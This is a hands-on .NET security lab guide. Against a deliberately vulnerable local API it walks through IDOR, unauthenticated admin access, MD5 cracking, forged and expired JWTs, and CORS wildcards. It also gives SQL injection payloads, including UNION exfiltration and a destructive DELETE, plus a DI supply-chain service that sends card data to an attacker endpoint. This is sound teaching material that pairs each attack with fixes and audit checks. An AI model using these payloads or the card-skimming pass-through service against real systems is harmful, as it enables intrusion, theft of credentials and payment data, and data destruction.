Code-Blooded

.NET Security Forensic Lab. A hands-on investigation of complex security flaws in modern .NET 10 — beyond simple input validation. In Part 1 you play forensic analyst on a deliberately vulnerable, partly AI-generated (“vibecoded”) e-commerce API, hunting the OWASP Top 10 with static analysis and asking whether AI-suggested fixes actually help or add new risk. In Part 2 you weaponize a dependency-injection supply-chain attack — then design the defenses.

⏱ 3 hours 🎯 7 OWASP categories 🔬 Semgrep SAST 📦 Supply‑chain attack ✅ Progress saved locally
Part 1 runs in groups — you don't hand-patch anything. Your group's coding agent fixes your categories; your group puts its work on trial, then presents it.
1 · See
The presenter demos two flaws live.
2 · Scan
Everyone scans once. Groups get their categories.
3 · Fix
Your agent fixes your findings.
4 · Prove & audit
Re-run the attack. Read the diff. Did it really fix it?
5 · Present
4 minutes: the problem, the fix, the proof, what it missed.

The app Aviato is partly AI-generated and deliberately broken, running on your own machine. The lesson isn't “the agent is bad” — it will fix most of this correctly. The lesson is that most isn't all, and you can only tell the difference by reading the diff.

Broken Access Control

A01▶ live demobrief

File: Aviato.API/http/01_A01_broken_access_control.http

🧭 Six briefs — work on yours
These are the category briefs: the attacks, why they work, and the audit checklist for the agent's fix. Work through your group's; read the others if you're curious — you'll hear about them in the presentations. A01 and A03 are also demoed live (▶ live demo).

Two independent flaws: an IDOR (one user reads another user's order) and a completely unauthenticated admin endpoint.

(a) IDOR — Bob reads Alice's order

Alice and Bob each create an order. Bob then requests order #1 (Alice's) with his own token. Running this from the page means switching identity in the top bar between the two requests — log in as alice for the setup, then as bob for the attack.

http · setup
# Alice places an order — note the id in the response
POST http://localhost:5218/orders
Authorization: Bearer {{aliceToken}}
Content-Type: application/json

{ "items": [ { "productId": 1, "quantity": 1 } ] }
http
# Bob is logged in, but asks for Alice's order #1
GET http://localhost:5218/orders/1
Authorization: Bearer {{bobToken}}
Expected (secure)Actual
403 Forbidden200 OK — Bob sees Alice's order ✓ vulnerability

(b) Admin endpoint with no auth at all

http
# No token whatsoever
GET http://localhost:5218/admin/users
Expected (secure)Actual
401 Unauthorized200 OK — every user + password hash returned ✓
💡 Why it happens
GET /orders/{id} never compares order.UserId to the caller, and /admin/users is missing .RequireAuthorization().
Reproduced both A01 flaws (IDOR + open admin endpoint)

Audit the agent's fix

When your agent patches these, read the diff — don't trust its summary:

Ownership, not just a login check
Re-run Bob → GET /orders/1: must be 403. Then alice's token → /admin/users: must be 403 too. Agents reliably add .RequireAuthorization() and forget RequireRole("admin") — so every logged-in customer can still read the hashes.
Same bug, other routes
It fixed the line Semgrep flagged. Did it fix the identical pattern on every other /{id} route, or just that one?
🌍 Where else does this hide?
Any route that takes an object id from the URL and trusts it: /invoices/{id}, password-reset links, profile pages, downloadable receipts, S3 object keys, GraphQL node(id). IDOR tops the API Top-10 precisely because the id is right there and the ownership check is one easy line to forget.

Cryptographic Failures

A02brief

File: Aviato.API/http/02_A02_cryptographic_failures.http

Passwords are hashed with bare MD5 (fast, unsalted) and the JWT secret is hardcoded — so anyone who knows it can mint their own admin token.

(a) Crack an MD5 password hash

  1. Register a user with password hunter2.
  2. Call GET /admin/users and find the hash 2ab96390c7dbe3439de74d0c9b0b1767.
  3. Paste it into crackstation.net — instant hit, because unsalted MD5 lives in every rainbow table.
http
# Register a user — the password is hunter2
POST http://localhost:5218/auth/register
Content-Type: application/json

{
  "username": "victim",
  "email": "victim@example.com",
  "password": "hunter2"
}
http
# Hash for hunter2: 2ab96390c7dbe3439de74d0c9b0b1767
GET http://localhost:5218/admin/users
⚠ Order matters
If you've already fixed A01, /admin/users now needs an admin token. Log in as admin in the top bar and run the request below — otherwise you'll get 401 instead of the hash. (This is audit question 5 in action: a fix in one place breaks an exploit elsewhere.)

Once the agent takes the secret out of appsettings.json, the API will not start until you provide one. Set it locally (it never enters git):

or use the environment variable Jwt__Secret. This also invalidates every pre-made token — a fresh login is the proof the fix works.
Cracked the MD5 hash & understood the forged-token risk

Audit the agent's fix

This is the richest fix to audit — check all three:

The timing trap (the headline)
Swapping MD5→BCrypt makes login slow only for real users. Time a login for a real vs an unknown username — if they differ, the fix just created an account-enumeration side channel. This is the moment the whole lab is built around — if you find it, it's the centre of your presentation.
bash · median login time, real vs unknown user
for u in alice nosuchuser; do
  for i in $(seq 15); do
    curl -s -o /dev/null -w "%{time_total}\n" -X POST http://localhost:5218/auth/login \
      -H "Content-Type: application/json" -d "{\"username\":\"$u\",\"password\":\"wrong\"}"
  done | sort -n | sed -n 8p | xargs echo "$u median:"
done
The fallback default
Search the diff for ?? "aviato-jwt-signing-key-2024-prod!". Agents love a fallback — and the fallback is the vulnerability, put back.
Did it lock everyone out?
If it didn't migrate the existing seeded hashes, every pre-existing account can no longer log in. It only looks fine because the DB re-seeds on restart.
🌍 Where else does this hide?
Any MD5/SHA1 used for passwords or signatures; secrets committed in appsettings.json, .env, or CI variables; API keys baked into mobile/JS bundles; TLS downgraded to old ciphers. The pattern is "a secret that isn't actually secret, or a hash that's too fast."

SQL Injection

A03▶ live demobrief

File: Aviato.API/http/03_A03_sql_injection.http

The product search builds raw SQL by string interpolation:
SELECT * FROM Products WHERE Name LIKE '%{q}%'. Three escalating payloads:

http · reference
GET http://localhost:5218/products/search?q=laptop
#Payload (?q=)Effect
a' OR '1'='1Boolean bypass → all products returned
bx' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--Exfiltrates the Users table (names + hashes)
cx'; DELETE FROM Products;--⚠ Deletes all products (use Reset application after)
⚠ Destructive step
Payload (c) really empties the table. After running it, GET /products returns []. Use Reset application in the sidebar to restart the API and restore the seed.
💡 Why it happens
ProductService.cs uses FromSqlRaw($"... {query} ..."). The user string becomes part of the SQL text.
Ran all three injections (bypass, UNION exfil, DELETE)
Use Reset application afterwards so the seed data is back.

Audit the agent's fix

The payloads will fail after almost any change. That doesn't mean it's fixed:

Parameters, not sanitisation
Did it use a query parameter / EF.Functions.Like, or just strip quotes and block the word DELETE? Only parameterisation is a real fix — the rest is one encoding trick from working again.
Regression check
Can you still search for a product called O'Brien's? Over-aggressive input-stripping breaks legitimate input.
🌍 Where else does this hide?
Anywhere user input is concatenated into a query string: a LIKE search, an ORDER BY column picked from a dropdown, dynamic filter builders, report exports. The same class shows up as NoSQL injection (Mongo $where), LDAP filters, and OS-command injection — untrusted data changing the structure of a command.

Security Misconfiguration

A05brief

File: Aviato.API/http/04_A05_security_misconfiguration.http

(a) Debug endpoint leaks the whole config

http
GET http://localhost:5218/debug/config

Returns the JWT secret, ASPNETCORE_ENVIRONMENT and every configuration value in plaintext — no auth, no rate limit. In production this leaks connection strings and API keys.

⚠ Those are your environment variables
The config includes every environment variable of the shell that started the API. If you have API keys or tokens exported, they are in this response — don't screen-share it.

(b) CORS wildcard

http · preflight from a foreign origin
OPTIONS http://localhost:5218/products
Origin: https://evil-attacker.com
Access-Control-Request-Method: GET

Response carries Access-Control-Allow-Origin: * — any website can read the API in a logged-in user's browser context.

Leaked the config & observed the CORS wildcard

Audit the agent's fix

Both of these fixes love to look done:

The Development trap
Gating /debug/config behind IsDevelopment() reads as fixed — but the lab runs in Development, so it's still wide open. Re-run GET /debug/config: is it actually a 404?
Wildcard in disguise
Check CORS for SetIsOriginAllowed(_ => true) or WithOrigins("*") — the same wildcard wearing new syntax.
🌍 Where else does this hide?
Verbose stack-trace error pages in prod, Swagger/actuator/metrics endpoints left public, default admin credentials, an S3 bucket set to public-read, a served .env, directory listing on. Misconfiguration is "the code is fine, the switch was left in the wrong position."

Identification & Authentication Failures

A07brief

File: Aviato.API/http/05_A07_auth_failures.http

Token validation is switched off in three places (Program.cs → TokenValidationParameters).

TestBroken settingResult
Token expired in 2020ValidateLifetime = falseStill accepted — a stolen token never dies
Token issued for hr-systemValidateIssuer/Audience = falseAccepted — token confusion across services
💡 Why it matters
Any other service sharing the secret can hand out tokens the Aviato API trusts — one compromised service compromises all of them.
Used the expired & foreign-issuer tokens successfully
Ready-made tokens are in the .http file and in Step 0.

Audit the agent's fix

One fix here breaks loudly (fine); the dangerous one is silent:

The quiet miss
Did it set ValidateLifetime = true but leave the issued token with no expires claim? Nothing breaks, the scanner's happy, and tokens still never expire. Re-issue one and check for exp.
Issuer / audience wired end-to-end
Turning validation on without setting ValidIssuer/ValidAudience at token creation breaks login. Confirm a fresh login still works and the hr-system token now returns 401.
🌍 Where else does this hide?
Sessions that never expire or aren't revoked on logout/password-change, missing MFA, OAuth redirect_uri not pinned, refresh tokens with no rotation, one shared signing key across microservices. "Who are you, and is this token still supposed to work?" — usually one of those two checks is missing.

🌍 Where else does this hide?
Full request/response body logging, Authorization headers in access logs, exception messages that embed secrets, analytics/session-replay capturing form fields, tokens in URLs landing in referer logs. Ask of every log line: "would I be comfortable with this in a third-party log aggregator?"

⚠ Create the order first

2.1 · How the override works

~15 min

.NET's DI container keeps the last registration for an interface. Register a second implementation after the real one and it silently wins.

csharp · Program.cs
// legitimate registration — always on
builder.Services.AddScoped<IPaymentService, PaymentService>();

// Workshop switch: the package is only wired in for Part 2.
//   dotnet run --project Aviato.API --launch-profile http-part2
if (builder.Configuration.GetValue<bool>("Workshop:EnablePart2"))
{
    builder.Services.AddNugetPackageServices();
    //   └─ services.AddScoped<IPaymentService, MaliciousPaymentService>();
    // → last registration wins. PaymentService is silently replaced.
}

In Part 1 the override is switched off, so the real PaymentService answers every payment. For Part 2 we flip one flag (a config switch that simulates "the developer added the package") and the same request is silently answered by Aviato.Dependencies/MaliciousPaymentService.cs, which exfiltrates the card data and then calls the real service so the user notices nothing (a "pass-through"):

csharp · MaliciousPaymentService
// 1. exfiltrate to the attacker's server
await client.PostAsJsonAsync(
    "http://localhost:5030/malicious-endpoint", request);

// 2. pass through to the real service — nothing looks wrong
var legit = serviceProvider.GetServices<IPaymentService>()
    .First(s => s is not MaliciousPaymentService);
return await legit.ProcessPaymentAsync(request);

2.3 · Detection & defense

~20 min

A single dependency changed everything and left no trace in your code. Here's how you'd catch and prevent it.

ControlWhat it does
NuGet package signingOnly install packages signed by a trusted certificate; verify signatures on restore.
Lock filesCommit packages.lock.json + RestorePackagesWithLockFile=true so dependencies can't shift silently.
Deterministic / reproducible buildsSame source → bit-identical artifact, so tampering is detectable.
Dependency review in CIGitHub Dependency Review Action flags new/changed packages on every PR.
Validate the DI container at startupAssert every resolved service type against a whitelist — fail fast if IPaymentService isn't PaymentService.
Source mapping / provenanceMatch the package hash to verified source; prefer SLSA / signed provenance.
Startup guard — concrete example
csharp
var impl = app.Services.GetRequiredService<IPaymentService>().GetType();
if (impl != typeof(PaymentService))
    throw new InvalidOperationException(
        $"Unexpected IPaymentService: {impl.FullName}");
